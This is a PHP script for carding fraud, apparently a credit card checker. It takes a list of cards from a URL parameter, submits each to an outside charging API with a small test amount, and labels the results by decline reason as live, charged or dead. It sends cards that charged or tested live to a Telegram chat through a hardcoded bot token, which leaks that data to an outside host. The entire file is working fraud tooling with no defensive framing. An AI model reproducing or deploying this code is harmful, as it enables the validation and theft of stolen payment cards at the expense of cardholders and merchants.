<?php


$lista = $_GET['lista'];
   

$json_url = file_get_contents("http://znc-pro.fun/deltax/api/nonsk.php?lista=$lista&amount=0.5&tgid=5126439799&type=ccnrefund&forward=hit");

$th = urlencode($json_url);


//=================== [ RESPONSES ] ===================//

if (preg_match("/Charged /i", $json_url)){
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ @Im_kZ_T<br> ➤ Receipt : hidden';

    
    $msg  = file_get_contents("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=-1001729392109&text=$th"); 
}
elseif (preg_match("/CVV /i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
    $msg  = file_get_contents("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=-1001729392109&text=$th"); 
}
elseif (preg_match("/1 $ /i", $json_url)){
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ @Im_kZ_T<br> ➤ Receipt : hidden';
    $msg  = file_get_contents("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=-1001729392109&text=$th"); 
}


elseif (preg_match("/GENERIC DECLINED/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
    }
elseif (preg_match("/generic_decline/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
}
elseif (preg_match("/fund/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
    $msg  = file_get_contents("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=-1001729392109&text=$th"); 
}elseif (preg_match("/insufficient/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
    $msg  = file_get_contents("https://api.telegram.org/bot5514289130:AAEIbZr7W59obYlyX6JNtZjdIoJDUHI50TA/sendMessage?chat_id=-1001729392109&text=$th"); 
}

elseif (preg_match("/fraudulent/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif (preg_match("/DO NOT HONOR/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }

elseif (preg_match("/fraudulent/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';

}

elseif (preg_match("/incorrect_cvc/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect by @Im_kZ_T</span><br>';
}
elseif (preg_match("/#CCN/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect by @Im_kZ_T</span><br>';
     
}
elseif (preg_match("/incorrect/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect by @Im_kZ_T</span><br>';
     
}
elseif (preg_match("/honor/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif (preg_match("/lost/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif (preg_match("/stolen/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif (preg_match("/allowed/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif (preg_match("/authentication/i", $json_url)){
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 

elseif (preg_match("/support/i", $json_url)){
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }


elseif (preg_match("/not_support/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/Too/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/Many/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/request/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/sk/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: RIP SK Key ⚠️</span><br>';
}
else {
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE @Im_kZ_T</span><br>';
   
   
      
}

ob_flush();
?>